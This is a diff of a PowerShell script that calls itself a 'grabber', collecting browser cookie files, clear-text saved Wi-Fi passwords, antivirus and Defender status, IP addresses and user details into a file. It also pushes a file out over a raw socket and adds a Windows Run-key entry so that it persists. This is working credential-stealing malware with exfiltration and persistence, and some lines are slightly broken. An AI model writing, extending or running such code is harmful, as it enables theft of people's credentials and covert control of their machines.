@@ -1,4 +1,20 @@
-Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Cookie' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process5.txt 
+Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Cookie' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process5.txt
+
+Start-Sleep -Seconds 2
+
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE=$name;PASS=$pass }} | Format-Table -AutoSize | Out-File -FilePath ./Process5.txt -Append
+
+Start-Sleep -Seconds 2
+
+
+wmiQuery = "SELECT * FROM AntiVirusProduct"
+$AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters # -ErrorVariable myError -ErrorAction 'SilentlyContinue'             
+            Write-host $AntivirusProduct.displayName | Out-File -FilePath ./Process5.txt -Append
+
+Get-MpComputerStatus | Out-File -FilePath ./Process5.txt -Append
+
+Get-NetIPAddress | Out-File -FilePath ./Process5.txt -Append
+
 
 whoami | Out-File -FilePath ./Process5.txt -Append
 
@@ -11,6 +27,8 @@ Start-Sleep -Seconds 1.5
 ls | Out-File -FilePath ./Process5.txt -Append
 
 
+
+
 #start http post 
 
 $test=[io.file]::ReadAllBytes("Process2.txt");
@@ -20,14 +38,33 @@ $stream.write($test,0,$test.Length);
 $writer.flush();
 $socket.close()
 
+#Break Dir
+
+cd..
+
+cd..
+
+cd..
+
+cd..
+
+cd..
+
+cd..
+
+cd..
+
+cd Desktop
+
 
 
 #set registry
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Name "grabber" `
-    -Value "C:\Documents\#simple download.bat"
+    -Value "Desktop\#simple download.bat" 
 
 Start-Sleep -Seconds 1.5
 exit
 
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
